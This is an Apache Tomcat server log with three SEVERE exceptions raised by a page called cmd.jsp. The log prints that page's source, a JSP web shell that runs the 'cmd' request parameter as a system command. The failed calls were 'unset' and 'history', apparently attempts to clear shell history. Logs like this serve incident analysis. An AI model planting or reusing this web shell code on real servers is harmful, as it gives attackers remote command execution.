21-Sep-2021 07:15:07.796 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: contextInitialized()
21-Sep-2021 07:15:07.796 INFO [main] org.apache.catalina.core.ApplicationContext.log SessionListener: contextInitialized()
21-Sep-2021 07:15:07.797 INFO [main] org.apache.catalina.core.ApplicationContext.log ContextListener: attributeAdded('StockTicker', 'async.Stockticker@2415fc55')
21-Sep-2021 12:22:56.199 SEVERE [http-nio-8080-exec-14] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/jsp_app] threw exception
	java.io.IOException: An exception occurred processing [cmd.jsp] at line [14]

11: <%
12: if (request.getParameter("cmd") != null) {
13: out.println("Command: " + request.getParameter("cmd") + "<BR>");
14: Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
15: OutputStream os = p.getOutputStream();
16: InputStream in = p.getInputStream();
17: DataInputStream dis = new DataInputStream(in);


Stacktrace:
		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:494)
		at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:379)
		at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:327)
		at javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
		at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
		at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197)
		at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)
		at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:540)
		at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135)
		at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
		at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:687)
		at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)
		at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.lang.Thread.run(Thread.java:748)
	Caused by: java.io.IOException: Cannot run program "unset": error=2, No such file or directory
		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
		at java.lang.Runtime.exec(Runtime.java:621)
		at java.lang.Runtime.exec(Runtime.java:451)
		at java.lang.Runtime.exec(Runtime.java:348)
		at org.apache.jsp.cmd_jsp._jspService(cmd_jsp.java:134)
		at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
		at javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:466)
		... 25 more
	Caused by: java.io.IOException: error=2, No such file or directory
		at java.lang.UNIXProcess.forkAndExec(Native Method)
		at java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
		at java.lang.ProcessImpl.start(ProcessImpl.java:134)
		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
		... 32 more
21-Sep-2021 12:22:56.386 SEVERE [http-nio-8080-exec-15] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/jsp_app] threw exception
	java.io.IOException: An exception occurred processing [cmd.jsp] at line [14]

11: <%
12: if (request.getParameter("cmd") != null) {
13: out.println("Command: " + request.getParameter("cmd") + "<BR>");
14: Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
15: OutputStream os = p.getOutputStream();
16: InputStream in = p.getInputStream();
17: DataInputStream dis = new DataInputStream(in);


Stacktrace:
		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:494)
		at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:379)
		at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:327)
		at javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
		at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
		at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197)
		at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)
		at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:540)
		at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135)
		at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
		at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:687)
		at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)
		at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.lang.Thread.run(Thread.java:748)
	Caused by: java.io.IOException: Cannot run program "unset": error=2, No such file or directory
		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
		at java.lang.Runtime.exec(Runtime.java:621)
		at java.lang.Runtime.exec(Runtime.java:451)
		at java.lang.Runtime.exec(Runtime.java:348)
		at org.apache.jsp.cmd_jsp._jspService(cmd_jsp.java:134)
		at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
		at javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:466)
		... 25 more
	Caused by: java.io.IOException: error=2, No such file or directory
		at java.lang.UNIXProcess.forkAndExec(Native Method)
		at java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
		at java.lang.ProcessImpl.start(ProcessImpl.java:134)
		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
		... 32 more
21-Sep-2021 12:23:28.209 SEVERE [http-nio-8080-exec-17] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] in context with path [/jsp_app] threw exception
	java.io.IOException: An exception occurred processing [cmd.jsp] at line [14]

11: <%
12: if (request.getParameter("cmd") != null) {
13: out.println("Command: " + request.getParameter("cmd") + "<BR>");
14: Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
15: OutputStream os = p.getOutputStream();
16: InputStream in = p.getInputStream();
17: DataInputStream dis = new DataInputStream(in);


Stacktrace:
		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:494)
		at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:379)
		at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:327)
		at javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
		at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
		at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
		at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
		at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197)
		at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)
		at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:540)
		at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135)
		at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
		at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:687)
		at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)
		at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357)
		at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382)
		at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
		at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893)
		at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1726)
		at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
		at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
		at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
		at java.lang.Thread.run(Thread.java:748)
	Caused by: java.io.IOException: Cannot run program "history": error=2, No such file or directory
		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1048)
		at java.lang.Runtime.exec(Runtime.java:621)
		at java.lang.Runtime.exec(Runtime.java:451)
		at java.lang.Runtime.exec(Runtime.java:348)
		at org.apache.jsp.cmd_jsp._jspService(cmd_jsp.java:134)
		at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
		at javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
		at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:466)
		... 25 more
	Caused by: java.io.IOException: error=2, No such file or directory
		at java.lang.UNIXProcess.forkAndExec(Native Method)
		at java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
		at java.lang.ProcessImpl.start(ProcessImpl.java:134)
		at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
		... 32 more
21-Sep-2021 14:48:33.278 INFO [Thread-3] org.apache.catalina.core.ApplicationContext.log SessionListener: contextDestroyed()
21-Sep-2021 14:48:33.283 INFO [Thread-3] org.apache.catalina.core.ApplicationContext.log ContextListener: contextDestroyed()
